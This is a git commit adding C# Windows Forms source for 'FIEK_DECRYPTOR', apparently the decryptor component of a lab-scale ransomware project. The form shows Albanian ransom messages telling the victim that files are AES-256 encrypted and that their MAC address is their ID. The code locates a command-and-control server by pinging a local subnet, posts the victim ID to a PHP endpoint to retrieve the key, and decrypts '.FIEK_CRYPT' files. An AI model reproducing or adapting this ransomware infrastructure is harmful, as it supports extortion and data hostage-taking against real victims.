7a88a4d2765148526b2732026f473361cd91f0d0
KosmosDermaku <39444714+KosmosDermaku@users.noreply.github.com>
2018-09-05 00:13:10 +0200

    Add files via upload

---
+++ FIEK_DEC_R/FIEK_DEC_R/Form1.Designer.cs
@@ -0,0 +1,255 @@
+﻿namespace FIEK_DEC_R
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.wb_1 = new System.Windows.Forms.WebBrowser();
+            this.btn_get_key = new System.Windows.Forms.Button();
+            this.txt_key = new System.Windows.Forms.TextBox();
+            this.txt_iv = new System.Windows.Forms.TextBox();
+            this.btn_decrypt = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.pictureBox2 = new System.Windows.Forms.PictureBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.rtb_1 = new System.Windows.Forms.RichTextBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.label7 = new System.Windows.Forms.Label();
+            this.rtb_2 = new System.Windows.Forms.RichTextBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // wb_1
+            // 
+            this.wb_1.Location = new System.Drawing.Point(293, 371);
+            this.wb_1.MinimumSize = new System.Drawing.Size(20, 20);
+            this.wb_1.Name = "wb_1";
+            this.wb_1.ScrollBarsEnabled = false;
+            this.wb_1.Size = new System.Drawing.Size(645, 186);
+            this.wb_1.TabIndex = 0;
+            // 
+            // btn_get_key
+            // 
+            this.btn_get_key.BackColor = System.Drawing.Color.Coral;
+            this.btn_get_key.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.btn_get_key.FlatAppearance.BorderSize = 0;
+            this.btn_get_key.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btn_get_key.Font = new System.Drawing.Font("Consolas", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btn_get_key.ForeColor = System.Drawing.Color.White;
+            this.btn_get_key.Location = new System.Drawing.Point(512, 320);
+            this.btn_get_key.Name = "btn_get_key";
+            this.btn_get_key.Size = new System.Drawing.Size(133, 31);
+            this.btn_get_key.TabIndex = 1;
+            this.btn_get_key.Text = "Get Key";
+            this.btn_get_key.UseVisualStyleBackColor = false;
+            this.btn_get_key.Click += new System.EventHandler(this.btn_get_key_Click);
+            // 
+            // txt_key
+            // 
+            this.txt_key.BackColor = System.Drawing.Color.Teal;
+            this.txt_key.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.txt_key.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txt_key.ForeColor = System.Drawing.Color.White;
+            this.txt_key.Location = new System.Drawing.Point(293, 618);
+            this.txt_key.Name = "txt_key";
+            this.txt_key.Size = new System.Drawing.Size(531, 22);
+            this.txt_key.TabIndex = 3;
+            // 
+            // txt_iv
+            // 
+            this.txt_iv.BackColor = System.Drawing.Color.Teal;
+            this.txt_iv.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.txt_iv.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txt_iv.ForeColor = System.Drawing.Color.White;
+            this.txt_iv.Location = new System.Drawing.Point(293, 667);
+            this.txt_iv.Name = "txt_iv";
+            this.txt_iv.Size = new System.Drawing.Size(531, 22);
+            this.txt_iv.TabIndex = 4;
+            // 
+            // btn_decrypt
+            // 
+            this.btn_decrypt.BackColor = System.Drawing.Color.Coral;
+            this.btn_decrypt.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.btn_decrypt.FlatAppearance.BorderSize = 0;
+            this.btn_decrypt.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btn_decrypt.Font = new System.Drawing.Font("Consolas", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btn_decrypt.ForeColor = System.Drawing.Color.White;
+            this.btn_decrypt.Location = new System.Drawing.Point(837, 618);
+            this.btn_decrypt.Name = "btn_decrypt";
+            this.btn_decrypt.Size = new System.Drawing.Size(101, 69);
+            this.btn_decrypt.TabIndex = 7;
+            this.btn_decrypt.Text = "Decrypt";
+            this.btn_decrypt.UseVisualStyleBackColor = false;
+            this.btn_decrypt.Click += new System.EventHandler(this.btn_decrypt_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(12, 12);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(299, 229);
+            this.pictureBox1.TabIndex = 8;
+            this.pictureBox1.TabStop = false;
+            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
+            // 
+            // pictureBox2
+            // 
+            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
+            this.pictureBox2.Location = new System.Drawing.Point(317, 28);
+            this.pictureBox2.Name = "pictureBox2";
+            this.pictureBox2.Size = new System.Drawing.Size(621, 61);
+            this.pictureBox2.TabIndex = 9;
+            this.pictureBox2.TabStop = false;
+            // 
+            // label3
+            // 
+            this.label3.Font = new System.Drawing.Font("Consolas", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.White;
+            this.label3.Location = new System.Drawing.Point(317, 144);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(610, 61);
+            this.label3.TabIndex = 10;
+            this.label3.Text = "label3";
+            // 
+            // label4
+            // 
+            this.label4.Font = new System.Drawing.Font("Consolas", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label4.ForeColor = System.Drawing.Color.White;
+            this.label4.Location = new System.Drawing.Point(317, 205);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(610, 61);
+            this.label4.TabIndex = 11;
+            this.label4.Text = "label4";
+            // 
+            // label5
+            // 
+            this.label5.Font = new System.Drawing.Font("Consolas", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label5.ForeColor = System.Drawing.Color.White;
+            this.label5.Location = new System.Drawing.Point(275, 323);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(82, 23);
+            this.label5.TabIndex = 12;
+            this.label5.Text = ">> ID";
+            // 
+            // rtb_1
+            // 
+            this.rtb_1.BackColor = System.Drawing.Color.Teal;
+            this.rtb_1.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.rtb_1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.rtb_1.ForeColor = System.Drawing.Color.White;
+            this.rtb_1.Location = new System.Drawing.Point(375, 320);
+            this.rtb_1.Name = "rtb_1";
+            this.rtb_1.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.None;
+            this.rtb_1.Size = new System.Drawing.Size(100, 31);
+            this.rtb_1.TabIndex = 13;
+            this.rtb_1.Text = "";
+            // 
+            // label6
+            // 
+            this.label6.Font = new System.Drawing.Font("Consolas", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label6.ForeColor = System.Drawing.Color.White;
+            this.label6.Location = new System.Drawing.Point(289, 588);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(156, 23);
+            this.label6.TabIndex = 14;
+            this.label6.Text = ">> Secret Key";
+            // 
+            // label7
+            // 
+            this.label7.Font = new System.Drawing.Font("Consolas", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label7.ForeColor = System.Drawing.Color.White;
+            this.label7.Location = new System.Drawing.Point(289, 641);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(169, 23);
+            this.label7.TabIndex = 15;
+            this.label7.Text = ">> IV";
+            // 
+            // rtb_2
+            // 
+            this.rtb_2.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.rtb_2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.rtb_2.Location = new System.Drawing.Point(98, 237);
+            this.rtb_2.Name = "rtb_2";
+            this.rtb_2.Size = new System.Drawing.Size(131, 450);
+            this.rtb_2.TabIndex = 16;
+            this.rtb_2.Text = "";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.AutoScroll = true;
+            this.BackColor = System.Drawing.Color.Gray;
+            this.ClientSize = new System.Drawing.Size(964, 713);
+            this.Controls.Add(this.rtb_2);
+            this.Controls.Add(this.label7);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.rtb_1);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.pictureBox2);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.btn_decrypt);
+            this.Controls.Add(this.txt_iv);
+            this.Controls.Add(this.txt_key);
+            this.Controls.Add(this.btn_get_key);
+            this.Controls.Add(this.wb_1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Name = "Form1";
+            this.Text = "FIEK_DECRYPTOR";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.WebBrowser wb_1;
+        private System.Windows.Forms.Button btn_get_key;
+        private System.Windows.Forms.TextBox txt_key;
+        private System.Windows.Forms.TextBox txt_iv;
+        private System.Windows.Forms.Button btn_decrypt;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.PictureBox pictureBox2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.RichTextBox rtb_1;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label7;
+        private System.Windows.Forms.RichTextBox rtb_2;
+    }
+}
+
---
+++ FIEK_DEC_R/FIEK_DEC_R/Form1.cs
@@ -0,0 +1,190 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Security.Cryptography;
+using System.Net.Sockets;
+
+namespace FIEK_DEC_R
+{
+    public partial class Form1 : Form
+    {
+
+        Rijndael AES = Rijndael.Create();
+        
+
+        public Form1()
+        {
+            InitializeComponent();
+            this.BackColor = Color.FromArgb(37, 37, 37);
+            rtb_2.BackColor = Color.FromArgb(37, 37, 37);
+            rtb_2.ForeColor = Color.White;
+            // "010001100100000101001011010101010100110001010100010001010101010001001001001000000100100100100000010010010100111001011000010010000100100101001110010010010100010101010010010010010101001101000101001000000100010101001100010001010100101101010100010100100100100101001011010001010010000001000100010010000100010100100000010010110100111101001101010100000100101001010101010101000100010101010010010010010100101101000101"
+            rtb_2.Text = "01000110010000010100101101010101010011000101010001000101010101000100100100100000010010010010000001001001010011100101100001001000010010010100111001001001010001010101001001001001010100110100010100100000010001010100110001000101010010110101010001010010010010010100101101000101001000000100010001001000010001010010000001001011010011110100110101010000010010100101010101010100010001010101001001001001010010110100010100000000";
+            rtb_2.ReadOnly = true;
+            wb_1.DocumentText = "<body style='background-color:rgb(37,37,37);'>";
+        }
+
+        private void btn_get_key_Click(object sender, EventArgs e)
+        {
+            string response = web_1(rtb_1.Text);
+            wb_1.DocumentText = response;
+        }
+
+
+
+        public string web_1(string k1)
+        {
+            string c2 = getActiveC2();
+            //string c2 = "192.168.10.101";
+            string requestmethod = "POST";
+            string postData = "var1=" + k1;
+
+            //The Byte Array that will be used for writing the data to the stream.
+            byte[] byteArray = Encoding.ASCII.GetBytes(postData);
+            string URL = "http://"+c2+"/Ushtrime/a4.php";
+            string contenttype = "application/x-www-form-urlencoded";
+            string responseFromServer = null;
+            WebRequest request = WebRequest.Create(URL);
+            Stream dataStream;
+            WebResponse response;
+            StreamReader reader;
+            request.Method = requestmethod;
+            request.ContentType = contenttype;
+            request.ContentLength = byteArray.Length;
+            dataStream = request.GetRequestStream();
+            dataStream.Write(byteArray, 0, byteArray.Length);
+            dataStream.Close();
+            response = request.GetResponse();
+            dataStream = response.GetResponseStream();
+            reader = new StreamReader(dataStream);
+            responseFromServer = reader.ReadToEnd();
+            reader.Close();
+            dataStream.Close();
+            response.Close();
+            return responseFromServer;
+        }
+
+        private void btn_decrypt_Click(object sender, EventArgs e)
+        {
+            AES.Key = Convert.FromBase64String(txt_key.Text);
+            AES.IV = Convert.FromBase64String(txt_iv.Text);
+            string dir_name = "C:\\Users\\Tester\\Desktop\\ENC_TST";
+            Decrypt_Directory(dir_name);
+        }
+
+        private void Decrypt_Directory(string s_path)
+        {
+            string[] ext = new[] { ".txt", ".doc", ".docx", ".pdf", ".jpg", ".jpeg", ".gif" };
+            //get list of files in the targeted directory
+            string[] files = Directory.GetFiles(s_path);
+            int count = 0;
+            foreach (string f_h in files)
+            {
+                string extension = Path.GetExtension(f_h);
+                MessageBox.Show(f_h + "   EXT: " + extension);
+                if (extension == ".FIEK_CRYPT")
+                {
+                    
+                    File_Decrypt(f_h);
+                }
+               
+            }
+        }
+
+        private void File_Decrypt(string st)
+        {
+           
+            FileStream fs_1 = new FileStream(st, FileMode.Open);
+            CryptoStream cs_1 = new CryptoStream(fs_1, AES.CreateDecryptor(), CryptoStreamMode.Read);
+            StreamReader sr_1 = new StreamReader(cs_1);
+            string txt_r = sr_1.ReadToEnd();
+            MessageBox.Show("READ: " + txt_r);
+            fs_1.Close();
+            cs_1.Close();
+            sr_1.Close();
+            FileStream fs_w = new FileStream(st, FileMode.Create);
+            StreamWriter sw_1 = new StreamWriter(fs_w);
+            sw_1.Write(txt_r);
+            sw_1.Flush();
+            sw_1.Close();
+            fs_w.Close();
+            string n_path = st.Replace(".FIEK_CRYPT", "");
+            File.Move(st, n_path);
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            string msg_1 = "> Te dhenat tuaja jane enkriptuar me algoritmin AES-256 " +
+                           "\n  dhe nuk jane te perdorshme";
+
+            string msg_2 = "> Ato mund te kthehen vetem permes dekriptimit me çelesin " +
+                "\n  sekret, ID-ja juaj per identifikim eshte MAC Adresa";
+            label3.Text = msg_1;
+            label4.Text = msg_2;
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private string getActiveC2()
+        {
+            string active_c2 = "";
+            string[] c2_arr = { "192.168.10.100", "192.168.10.101", "192.168.10.102", "192.168.10.103", "192.168.10.104" };
+            try
+            {
+                string localIP;
+                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
+                {
+                    socket.Connect("8.8.8.8", 65530);
+                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
+                    localIP = endPoint.Address.ToString();
+                }
+
+                Ping pingSender = new Ping();
+                for (int i = 90; i < 120; i++)
+                {
+                    string ip = "192.168.10." + i.ToString();
+                    if (ip == localIP)
+                    {
+                        continue;
+                    }
+                    else
+                    {
+                     
+                        PingReply reply = pingSender.Send(ip);
+                        if (reply.Status == IPStatus.Success)
+                        {
+                            active_c2 = ip;
+                            break;
+                        }
+                        else
+                        {
+
+                        }
+                     
+                    }
+                }
+                
+
+            }
+            catch (PingException EX)
+            {
+                MessageBox.Show(EX.ToString());
+            }
+
+            return active_c2;
+        }
+    }
+}
